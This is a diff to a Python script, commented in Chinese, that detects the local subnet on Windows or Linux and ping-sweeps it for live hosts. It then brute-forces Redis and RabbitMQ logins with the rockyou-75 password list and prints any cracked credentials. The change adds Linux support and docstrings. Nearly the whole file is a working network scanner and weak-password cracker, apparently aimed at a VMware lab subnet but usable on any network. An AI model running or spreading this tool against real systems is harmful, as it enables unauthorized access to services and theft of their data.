@@ -1,77 +1,105 @@
+
 import subprocess
 import socket
 import redis
 import json
 import pika
 import re
+import platform
+import shutil
 
 def get_network_prefix():
-    try:
-        output = subprocess.check_output("ipconfig", encoding='gbk', errors='ignore')
-        lines = output.splitlines()
-
-        block = []
-        collecting = False
-        for line in lines:
-            # 检测 VMnet8 网卡标题行
-            if "VMware Network Adapter VMnet8" in line:
-                collecting = True
-                block.append(line)
-                continue
-            if collecting:
-                # 如果遇到下一个“适配器”开头的行，说明下一个网卡开始，结束收集
-                if re.match(r"^\s*.*适配器.*:", line) and "VMware Network Adapter VMnet8" not in line:
-                    break
-                block.append(line)
-
-        # 输出收集到的内容调试
-        print("[DEBUG] VMnet8 网卡信息块内容：")
-        for l in block:
-            print(l)
-
-        block_text = "\n".join(block)
-        # 提取 IPv4 地址
-        match = re.search(r"IPv4\s*地址.*?[：:]\s*([\d]+\.[\d]+\.[\d]+\.[\d]+)", block_text)
-        if match:
-            ip = match.group(1)
-            prefix = ".".join(ip.split(".")[:3]) + "."
-            print(f"[INFO] 虚拟网关前缀：{prefix}（来自 VMnet8）")
-            return prefix
-        else:
-            print("[WARN] 未在 VMnet8 网卡中找到 IPv4 地址")
-
-    except Exception as e:
-        print(f"[ERROR] 获取网关失败: {e}")
+    """
+    获取网络前缀（适配 Windows 和 Linux，支持 ip/ifconfig）
+    """
+    system = platform.system()
+    if system == "Windows":
+        try:
+            output = subprocess.check_output("ipconfig", encoding='gbk', errors='ignore')
+            lines = output.splitlines()
+            block = []
+            collecting = False
+            for line in lines:
+                if "VMware Network Adapter VMnet8" in line:
+                    collecting = True
+                    block.append(line)
+                    continue
+                if collecting:
+                    if re.match(r"^\s*.*适配器.*:", line) and "VMware Network Adapter VMnet8" not in line:
+                        break
+                    block.append(line)
+            block_text = "\n".join(block)
+            match = re.search(r"IPv4\s*地址.*?[：:]\s*([\d]+\.[\d]+\.[\d]+\.[\d]+)", block_text)
+            if match:
+                ip = match.group(1)
+                prefix = ".".join(ip.split(".")[:3]) + "."
+                print(f"[INFO] 虚拟网关前缀：{prefix}（来自 VMnet8）")
+                return prefix
+            else:
+                print("[WARN] 未在 VMnet8 网卡中找到 IPv4 地址")
+        except Exception as e:
+            print(f"[ERROR] 获取网关失败: {e}")
+    else:
+        # Linux: 优先用 ip，再用 ifconfig
+        try:
+            if shutil.which("ip"):
+                output = subprocess.check_output(["ip", "addr"], encoding='utf-8', errors='ignore')
+                # 取第一个非127的网段
+                matches = re.findall(r"inet\s+([\d]+\.[\d]+\.[\d]+)\.", output)
+                for m in matches:
+                    if not m.startswith("127"):
+                        prefix = m + "."
+                        print(f"[INFO] 虚拟网关前缀：{prefix}（来自 ip addr）")
+                        return prefix
+            elif shutil.which("ifconfig"):
+                output = subprocess.check_output(["ifconfig"], encoding='utf-8', errors='ignore')
+                matches = re.findall(r"inet (?:addr:)?([\d]+\.[\d]+\.[\d]+)\.", output)
+                for m in matches:
+                    if not m.startswith("127"):
+                        prefix = m + "."
+                        print(f"[INFO] 虚拟网关前缀：{prefix}（来自 ifconfig）")
+                        return prefix
+            else:
+                print("[ERROR] 未找到 ip 或 ifconfig 命令")
+        except Exception as e:
+            print(f"[ERROR] 获取网关失败: {e}")
     return None
 
-
-
-
-
-# ping 探测主机是否存活
 def ping_host(ip):
+    """
+    检测主机是否存活（适配 Windows 和 Linux）
+    """
     try:
-        output = subprocess.check_output(
-            ["ping", "-n", "1", "-w", "200", ip],
-            stderr=subprocess.DEVNULL,
-            encoding='gbk'
-        )
-        return "TTL=" in output
+        if platform.system() == "Windows":
+            output = subprocess.check_output(
+                ["ping", "-n", "1", "-w", "200", ip],
+                stderr=subprocess.DEVNULL,
+                encoding='gbk'
+            )
+        else:
+            output = subprocess.check_output(
+                ["ping", "-c", "1", "-W", "1", ip],
+                stderr=subprocess.DEVNULL,
+                encoding='utf-8'
+            )
+        return "TTL=" in output or "ttl=" in output or "time=" in output
     except:
         return False
 
-
-# 检测端口是否开放
 def check_port(ip, port):
+    """
+    检测端口是否开放
+    """
     try:
         with socket.create_connection((ip, port), timeout=1):
             return True
     except:
         return False
 
-
-# 加载字典
 def load_passwords(path="rockyou-75.txt"):
+    """
+    加载密码字典
+    """
     try:
         with open(path, "r", encoding="utf-8", errors="ignore") as f:
             return [line.strip() for line in f if line.strip()]
@@ -79,9 +107,10 @@ def load_passwords(path="rockyou-75.txt"):
         print("[ERROR] 字典文件 rockyou-75.txt 未找到！")
         return []
 
-
-# Redis 弱口令爆破
 def brute_force_redis(ip, port, password_list):
+    """
+    Redis 弱口令爆破
+    """
     for pwd in password_list:
         try:
             r = redis.StrictRedis(host=ip, port=port, password=pwd, socket_connect_timeout=2)
@@ -93,9 +122,10 @@ def brute_force_redis(ip, port, password_list):
     print(f"[INFO] Redis {ip}:{port} 未发现弱口令")
     return None
 
-
-# RabbitMQ 弱口令爆破
 def brute_force_rabbitmq(ip, port, user_list, password_list):
+    """
+    RabbitMQ 弱口令爆破
+    """
     for username in user_list:
         for password in password_list:
             try:
@@ -118,11 +148,8 @@ def brute_force_rabbitmq(ip, port, user_list, password_list):
     print(f"[INFO] RabbitMQ {ip}:{port} 未发现弱口令")
     return None
 
-
-# 主函数
 def main():
     prefix = get_network_prefix()
-    print(f"[DEBUG] 获取到的网段前缀: {prefix}")  # 添加此行
     if not prefix:
         return
 
@@ -157,7 +184,6 @@ def main():
     # 输出爆破结果
     print("\n[RESULT] 爆破结果：")
     print(json.dumps(results, indent=2, ensure_ascii=False))
-
 
 if __name__ == "__main__":
     main()
